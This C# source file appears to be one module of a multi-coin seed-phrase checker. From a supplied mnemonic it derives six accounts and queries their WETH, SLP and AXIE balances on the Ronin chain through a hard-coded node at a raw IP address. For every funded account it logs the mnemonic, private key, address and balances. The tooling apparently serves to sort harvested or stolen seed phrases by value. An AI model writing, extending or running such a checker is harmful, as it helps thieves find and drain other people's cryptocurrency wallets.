using System;
using System.Collections.Generic;
using System.Linq;
using System.Numerics;
using System.Text;
using System.Threading.Tasks;
using Nethereum.ABI.FunctionEncoding.Attributes;
using Nethereum.Contracts;
using Nethereum.HdWallet;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using MetaTools.Models;

namespace MetaTools.Cryptos
{

    public class Ronin : Crypto
    {

        public Ronin()
        {
            this.name = "ronin";
        }


        [Function("balanceOf", "uint256")]
        private class BalanceOfFunction : FunctionMessage
        {
            [Parameter("address", "_owner", 1)]
            public string Owner { get; set; }
        }

        static Web3 web3 = new Web3("http://20.125.36.122:8545/");
        private static readonly List<Token> token_list = new List<Token>()
        {
        new Token() {name = "WETH", address = "0xc99a6a985ed2cac1ef41640596c5a5f9f4e19ef5", decimals = 18},
        new Token() {name = "SLP", address = "0xa8754b9fa15fc18bb59458815510e40a12cd2014", decimals = 0},
        new Token() {name = "AXIE", address = "0x32950db2a7164ae833121501c797d79e7b79d74c", decimals = 0},
        };


        private static int deep = 5;
        public override async Task check(string mnemonic)
        {
            try
            {
                var wallet = new Wallet(mnemonic, null, "m/44'/60'/0'/0/x", null);
                for (int i = 0; i <= deep; i++)
                {
                    var account = wallet.GetAccount(i);
                    string address = account.Address;
                    string privateKey = account.PrivateKey;
                    StringBuilder result = new StringBuilder($"============\n| {mnemonic}\n| {privateKey}\n| {address}\n");

                    var tokens = await get_Tokens(address);
                    if (tokens.Count != 0)
                    {
                        foreach (var t in tokens)
                        {
                            result.Append($"\n| {t.value} {t.name}");
                        }
                        results.Add(result.ToString());
                    }
                }
            }
            catch { }
        }

        public static async Task<List<Token>> get_Tokens(string address)
        {
            List<Token> tokens = new List<Token>();

            var balanceOfMessage = new BalanceOfFunction() { Owner = address };
            var queryHandler = web3.Eth.GetContractQueryHandler<BalanceOfFunction>();

            foreach (Token t in token_list)
            {
                while (true)
                {
                    try
                    {
                        var balance = Web3.Convert.FromWeiToBigDecimal(await queryHandler
                        .QueryAsync<BigInteger>(t.address, balanceOfMessage), t.decimals);

                        if (balance > 0)
                        {
                            tokens.Add(new Token() { address = t.address, name = t.name, value = balance.ToString() });
                        }
                        break;
                    }
                    catch { }
                }
            }

            return tokens;
        }


    }
}
